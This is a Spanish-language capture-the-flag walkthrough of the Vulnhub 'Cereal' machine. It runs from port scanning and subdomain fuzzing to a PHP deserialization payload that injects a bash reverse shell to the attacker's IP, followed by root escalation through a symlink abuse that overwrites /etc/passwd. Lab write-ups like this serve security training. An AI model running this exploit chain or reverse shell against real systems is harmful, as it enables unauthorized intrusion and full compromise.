[[Vulnhub]] [[Disiplinas.]]

Martes 25 de Julio del 2023 Mexico.
CDMX-Polanco
Valente Spiegel

![[Pasted image 20230727103950.png]]
![[Pasted image 20230727104520.png|900]]

---
# Habilidades. 

Enumeración FTP 
Hospedaje Virtual 
Enumeración de Subdominios 
Divulgación de Información - Descubrimiento de Archivos de Respaldo 
Ataque de Deserialización PHP [RCE] 
Enumeración de Tareas Programadas (pspy) 
Abuso de Tarea Programada (Chown Symlink) [Escalada de Privilegios]

# Certificaciones.

eWPT  
eCPPTv2

---
---
# Creación de directorios para espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

```
mkdir Cereal && cd Cereal && mkdir {Scan,Content,Exploits,Evidencia} && ls && cd Scan
```
![[Pasted image 20230727104049.png]]

---
---
# Escaneo.

```
sudo netdiscover
sudo arp-scan -I ens33 --localnet
```

![[Pasted image 20230727105129.png]]
![[Pasted image 20230727105149.png]]

```
ping -c 1 192.168.153.142
```

![[Pasted image 20230727105202.png]]


==La maquina tiene por IP la 192.168.153.142 
```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.142
```

![[Pasted image 20230727110135.png]]

```
sudo nmap -sCV -p21,22,80,139,445,3306,11111,22222,33333,33334,44441,44444,55551,55555 192.168.153.142 -oN targeted
```

![[Pasted image 20230727110522.png]]

==El resultado nos arroja una buena cantidad de puertos abiertos., a lo que nos vamos a consentrar es a reaalizar una buena enumeracion web e intentar conectarnos por ftp para ver informacion privilegiada.
```
ftp 192.168.153.142
```

![[Pasted image 20230727110826.png]]
![[Pasted image 20230727110959.png]]

==Sin encontrar nada en el FTP cambiamos de vector de ataque a el escaneo y enumeración web.

---

# Enumeración web.

```
whatweb 192.168.153.142
```

![[Pasted image 20230727111137.png]]

http://192.168.153.142
==Apahe server
![[Pasted image 20230727111155.png]]

==Se realiza un escaneo de fuerza bruta a directorios.
```
gobuster dir -u http://192.168.153.142/ -w /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,html,php
```

![[Pasted image 20230727112833.png]]

http://192.168.153.142/blog

![[Pasted image 20230727112954.png]]

http://192.168.153.142/admin

![[Pasted image 20230727113008.png]]

==Como se observa la pagina esta pidiendo acceso a cereal.cft el cual no tenemos en uestras listas de DNS

![[Pasted image 20230727113053.png]]

```
nano /etc/hosts

192.168.153.142 cerea.ctf
```

![[Pasted image 20230727113221.png]]

==Ya incluido el nombre de dominio el sitio web se visualiza mejor.

http://192.168.153.142/blog

![[Pasted image 20230727113253.png]]

http://192.168.153.142/44441

![[Pasted image 20230727114323.png]]

==Lo obtenido fue de utilidad pero no suficiente para determinar un ataque, el puerto 44441 también despliega un servicio http el cual atacaremos con gubuster
```
gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-topmillon-5000.txt -t 20
```

![[Pasted image 20230727132412.png]]

```
nano /etc/hosts

192.168.153.142 cereal.ctf secure.cereal.ctf
```
==El resultado es exitoso encontrando otro nombre de dominio llamado secure.cereal.ctf el cual se tiene que agregar a el archivo /etc/hosts

![[Pasted image 20230727132520.png]]

http://192.168.153.142/44441

![[Pasted image 20230727132610.png]]

![[Pasted image 20230727133223.png]]

```
sudo tcpdump -i ens33 icmp -n
```

![[Pasted image 20230727133239.png]]

==La maquina parece estar desplegando un servicio de ping icmp el cual tiene alcansé con muestra maquina  por lo cual se puede interceptar la petición que parece viajar serializada.

![[Pasted image 20230727134002.png]]

==Con nuevos dominios descubiertos., es importante realzar un barrido para encontrar mas vectores de ataque.
```
gobuster dir -u http://secure.cerea.ctf:44441/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```

![[Pasted image 20230727145311.png]]

```
wfuzz -c -hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://secure.cereal.ctf:44441/back_en/FUZZ.php.bak
```

![[Pasted image 20230727145517.png]]

==Encontrando un dominio importante.

http://secure.cereal.ctf:44441/back_en/index.php.bak

![[Pasted image 20230801112158.png]]

==El código fuente de este servicio realiza un filtro de ip en congunto con una serializacion de la misma, es esto de lo que nos vamos a a probechar inyectandoole una shell hacia nuestra maquina.

---
# Escalamiento a usuario.

El código PHP que proporcionas parece tener la intención de serializar un objeto `pingTest` y luego imprimir el resultado codificado en URL. Sin embargo, hay un problema en la declaración de la propiedad `$ipAddress`. Parece que intentas ejecutar un comando de shell malicioso dentro de la propiedad, lo cual es una grave vulnerabilidad de seguridad.

El comando malicioso que se ha incluido en la propiedad `$ipAddress` es una forma de intentar obtener una shell inversa en el servidor objetivo. Es una práctica muy peligrosa e insegura, y no debería ser usada en ningún entorno, ya que podría ser utilizada para llevar a cabo ataques y acciones maliciosas.

```
<?php 
class pingTest { 
public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.153.129/443 0>&1'"; 
public $isValid = True; 
public $output = ""; 
} 
echo urlencode(serialize(new pingTest)); 
?>
```

![[Pasted image 20230801115652.png]]

```
php Pwned.php 2>/dev/null; echo
```

![[Pasted image 20230801115809.png]]

==La serialización parce ser correcta y procedemos a inyectarla en el input del servicio e interceptamos la peticion con burpsuite.

![[Pasted image 20230801120333.png]]

==Antes de dar forwoard debemos estar en escucha con nc en el puerto 443
```
sudo nc -nlvp 443
```
![[Pasted image 20230801120650.png]]

![[Pasted image 20230801120841.png]]

==Intercambiamos la serialización por la maliciosa y obtenemos acceso.

---
# Shell y tty

```
stty raw -echo; fg
```

![[Pasted image 20230801121316.png]]

```
export TERM=xterm
```

![[Pasted image 20230801121420.png]]

```
cd /home/
ls
cd rocky/ && cat local.txt
```

![[Pasted image 20230801121536.png]]
```
cat /etc/os-release
```
![[Pasted image 20230801122245.png]]

```
find / -perm -4000 -ls 2>/dev/null
```

![[Pasted image 20230801122449.png]]

==El ataque consiste en revisar los procesos que hace la maquina y aprobecharnos de alguno de ellos., la herramienta pspy nos ayudara con esto.

![[Pasted image 20230801125810.png]]

==Se debe alojar en nuestro pc para después desplegar un servicio http y descargarla desde la shell de Cereal

```
sudo python3 -m http.server 80
```

![[Pasted image 20230801130153.png]]

```
cd /tmp/
wget 192.168.153.142:80/pspy64
```

![[Pasted image 20230801130203.png]]

==Condescender permisos y ejecutar.
```
chmod +x pspy64
./pspy64
```

![[Pasted image 20230801130242.png]]
![[Pasted image 20230801130341.png]]

---
# Escalamiento a root.

==La maquina tiene un proceso el cual le credenciales de una ruta accesible la cual podemos clonar y modificar.,

ln -s -f /etc/passwd passwd
ls -l

![[Pasted image 20230801133848.png]]

```
cat passwd
```

![[Pasted image 20230801133928.png]]

```
openssl passwd
hola
hola
```

![[Pasted image 20230801134531.png]]

```
watch -n 1 ls -l /etc/passwd

```
![[Pasted image 20230801134736.png]]
![[Pasted image 20230801134851.png]]

```
nano /etc/passwd
```

![[Pasted image 20230801134940.png]]

```
su root
hola 
whoami
cd /root/ && ls -la
```

![[Pasted image 20230801135032.png]]

```
cat proof.txt
```

![[Pasted image 20230801135058.png]]

---

